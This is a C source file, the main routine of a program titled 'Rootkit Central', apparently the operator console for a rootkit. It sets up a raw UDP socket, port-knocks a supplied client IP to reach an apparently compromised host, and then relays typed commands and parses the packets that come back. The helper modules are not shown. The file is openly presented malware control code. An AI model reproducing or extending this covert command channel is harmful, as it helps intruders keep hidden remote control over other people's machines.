#include <stdio.h>
#include <getopt.h>
#include <signal.h>
#include <stdbool.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include "menu.h"
#include "networking.h"
#include "protocol.h"
#include "utils.h"

void usage(const char *program_name) {
    printf("--------------------------------------------------------------------\n");
    printf("Rootkit Central\n");
    printf("--------------------------------------------------------------------\n");
    printf("Usage: %s [options]\n\n", program_name);
    printf("Options:\n");
    printf("\t -c, --client_address <ip address>\n");
    printf("\t -h, --help          Show help message\n\n");
}

static void signal_handler(const int sig_no) {
    if (sig_no == SIGINT || sig_no == SIGTERM) {
        fprintf(stderr, "Received signal %d, shutting down\n", sig_no);
        exit_flag = true;
    }
}

int handle_arguments(const int argc, char * argv[], struct server_options * server_options) {
    static struct option long_options[] = {
        {"client_address",    required_argument, 0, 'c'},
        {"help",              no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "c:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'c': {
                server_options->client_ip_address = optarg;
                break;
            }
            case 'h':
                usage(argv[0]);
                return EXIT_SUCCESS;
            default:
                usage(argv[0]);
                return EXIT_FAILURE;
        }
    }

    if (argc <= 1) {
        fprintf(stderr, "Not enough arguments provided\n");
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    if (server_options->client_ip_address == NULL) {
        fprintf(stderr, "Client IP not provided\n");
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

int main(const int argc, char * argv[]) {
    // Check if running as root
    if (geteuid() != 0) {
        fprintf(stderr, "Warning: Not running as root. Some devices may not be accessible.\n");
        fprintf(stderr, "Consider running with: sudo %s\n\n", argv[0]);
    }

    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        fprintf(stderr, "Cannot set SIGINT handler\n");
        return EXIT_FAILURE;
    }
    if (signal(SIGTERM, signal_handler) == SIG_ERR) {
        fprintf(stderr, "Cannot set SIGTERM handler\n");
        return EXIT_FAILURE;
    }

    struct server_options server_options;
    server_options.client_ip_address = NULL;
    server_options.host = get_local_address();
    server_options.interface_name = get_local_interface_name();
    server_options.port = RECEIVING_PORT;

    const int return_value = handle_arguments(argc, argv, &server_options);
    if (return_value == EXIT_FAILURE) {
        fprintf(stderr, "Error parsing arguments\n");
        return EXIT_FAILURE;
    }

    // Create and setup raw socket
    const int raw_socket = create_raw_udp_socket();
    if (raw_socket == -1) {
        fprintf(stderr, "Error creating raw socket\n");
        return EXIT_FAILURE;
    }

    server_options.client_fd = raw_socket;

    const int return_val = bind_raw_socket(raw_socket, server_options.interface_name);
    if (return_val == -1) {
        fprintf(stderr, "Error binding raw socket to interface\n");
        close(raw_socket);
        return EXIT_FAILURE;
    }

    // Initiate Port Knock
    initiate_port_knocking(&server_options);

    // Set stdin to non-blocking mode
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    if (flags == -1) {
        fprintf(stderr, "F_GETFL on STDIN\n");
        return EXIT_FAILURE;
    }

    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
        return EXIT_FAILURE;
    }

    // Set raw_socket to non-blocking mode
    flags = fcntl(raw_socket, F_GETFL, 0);
    if (flags == -1) {
        fprintf(stderr, "F_GETFL on raw_socket\n");
        return EXIT_FAILURE;
    }

    if (fcntl(raw_socket, F_SETFL, flags | O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on raw_socket\n");
        return EXIT_FAILURE;
    }

    cmd_show_help();

    char buffer[4096];

    struct session_info session_info;
    session_info.head = NULL;
    session_info.command_counter = 0;
    session_info.packet_counter = 0;
    session_info.data_counter = 0;
    session_info.last_command_code = UNKNOWN;
    session_info.last_command_sequence_number = 0;

    while (!exit_flag) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(raw_socket, &fds);

        // Find the maximum file descriptor
        const int max_fd = (raw_socket > STDIN_FILENO) ? raw_socket : STDIN_FILENO;

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 100000;  // 100ms timeout

        const int r = select(max_fd + 1, &fds, NULL, NULL, &tv);

        if (r < 0) {
            if (errno == EINTR)
                continue;
            perror("select");
            break;
        }

        if (r == 0) {
            // Timeout, continue loop
            continue;
        }

        // Check if STDIN has data
        if (FD_ISSET(STDIN_FILENO, &fds)) {
            char character;
            const ssize_t result = read(STDIN_FILENO, &character, 1);

            if (result > 0) {
                process_command(&server_options, &character);
            } else if (result == -1 && errno != EAGAIN && errno != EWOULDBLOCK) {
                fprintf(stderr, "Failed to read from STDIN\n");
                break;
            }
        }

        // Check if raw_socket has data
        if (FD_ISSET(raw_socket, &fds)) {
            memset(buffer, 0, sizeof(buffer));
            const ssize_t n = recv(raw_socket, buffer, sizeof(buffer), 0);

            if (n < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    continue;
                }
                perror("recv");
                break;
            }

            if (n > 0) {
                struct packet_data * node = parse_raw_packet(buffer, n);
                if (node != NULL) {
                    handle_packet_data(&session_info, node);
                }
            }
        }
        fflush(stdout);
    }

    close(raw_socket);
    free_linked_list(session_info.head);

    return EXIT_SUCCESS;
}
